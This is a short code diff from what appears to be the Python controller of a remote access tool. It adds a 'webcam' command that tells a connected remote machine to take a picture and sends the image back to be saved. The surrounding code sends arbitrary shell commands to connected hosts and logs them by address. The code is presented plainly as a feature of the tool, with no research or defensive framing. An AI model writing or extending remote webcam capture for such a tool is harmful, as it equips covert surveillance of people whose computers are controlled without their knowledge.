@@ -250,6 +250,14 @@ def send_command(conn, address):
                     print(os.getcwd() + "> ", end="")
                     continue
                 
+                if cmd == "webcam":
+                    conn.send(str.encode(cmd))
+                    print(conn.recv(1024).decode('utf-8'))
+                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                    receive_file(conn, f"webcam_{timestamp}.png")
+                    print(os.getcwd() + "> ", end="")
+                    continue
+                
                 try:
                     conn.send(str.encode(cmd))
                     log_message(f"Command sent to {address[0]}: {cmd}")
